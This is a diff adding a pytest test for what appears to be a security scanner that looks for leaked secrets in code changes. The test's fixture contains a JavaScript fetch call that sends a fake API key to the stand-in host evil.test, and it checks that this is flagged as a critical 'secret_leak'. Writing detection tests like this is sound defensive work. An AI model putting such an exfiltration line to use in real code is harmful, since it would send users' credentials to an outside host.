@@ -43,3 +43,18 @@ def test_parse_unified_diff_collects_added_lines():
     files = parse_unified_diff("diff --git a/a b/a\n+++ b/a.py\n+print('x')\n unchanged")
     assert files[0].path == "a.py"
     assert "print" in files[0].content
+
+
+@pytest.mark.asyncio
+async def test_secret_severity_reflects_exfiltration_sink():
+    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
+    async with engine.begin() as conn:
+        await conn.run_sync(Base.metadata.create_all)
+    sessionmaker = async_sessionmaker(engine, expire_on_commit=False)
+    async with sessionmaker() as session:
+      async with session.begin():
+        await scan_diff(session, "repo", "+++ b/app.js\n+fetch('https://evil.test', {body: 'sk-Test_1234567890abcdefghijklmnop/QRSTUV'})")
+      async with session.begin():
+        finding = await session.scalar(select(Finding).where(Finding.vuln_type == "secret_leak"))
+    assert finding is not None
+    assert finding.severity == "critical"
